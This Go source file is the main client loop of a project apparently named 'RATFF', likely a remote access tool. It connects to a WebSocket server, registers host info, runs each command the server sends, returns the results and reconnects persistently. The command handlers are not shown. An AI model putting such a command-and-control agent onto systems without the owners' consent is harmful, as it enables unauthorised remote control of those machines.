package main

import (
	"os"
	"os/signal"
	"syscall"
	"time"

	"RATFF/shared"

	"github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
)

// log is the package-level logger instance.
var log *logrus.Entry

// asyncWriter holds the async writer for graceful shutdown.
var asyncWriter *shared.AsyncWriter

// reconnectAttempt tracks the number of consecutive reconnection attempts.
var reconnectAttempt int

// runClient establishes a WebSocket connection and runs the message loop.
func runClient(serverURL, clientID string) error {
	conn, _, err := websocket.DefaultDialer.Dial(serverURL, nil)
	if err != nil {
		return err
	}
	defer conn.Close()

	wsConn := shared.NewWSConn(conn)
	shared.SetupSafeHeartbeat(wsConn)

	info := shared.BuildClientInfo(clientID)
	msg := shared.NewMessage(shared.MsgRegister, "", clientID, info.ToPayload())
	if err := shared.SendSafeWSMessage(wsConn, msg); err != nil {
		return err
	}

	log.WithField("client_id", clientID).Info("Connected to server")

	reconnectAttempt = 0
	return messageLoop(wsConn)
}

// messageLoop continuously reads and processes messages from the server.
func messageLoop(wsConn *shared.WSConn) error {
	for {
		var msg shared.Message
		if err := shared.ReadWSMessage(wsConn.Conn, &msg); err != nil {
			return err
		}

		resp := executeCommand(msg)

		if err := shared.SendSafeWSMessage(wsConn, resp); err != nil {
			return err
		}
	}
}

func main() {
	log, asyncWriter = shared.InitLoggerWithWriter("info", "text", true)
	loadConfig()

	// Setup signal handler for graceful shutdown
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)

	serverURL := getServerURL()
	clientID := cfg.ClientID
	if clientID == "" {
		clientID = shared.GenerateClientID()
	}
	cfg.ClientID = clientID

	// Start shutdown listener
	go func() {
		<-quit
		log.Info("Shutting down client...")
		if asyncWriter != nil {
			asyncWriter.Close()
		}
		os.Exit(0)
	}()

	for {
		if err := runClient(serverURL, clientID); err != nil {
			log.Error("Connection lost: ", err)
		}

		reconnectAttempt++
		backoff := shared.CalculateBackoff(reconnectAttempt)
		log.WithField("attempt", reconnectAttempt).Infof("Reconnecting in %v...", backoff)
		time.Sleep(backoff)
	}
}
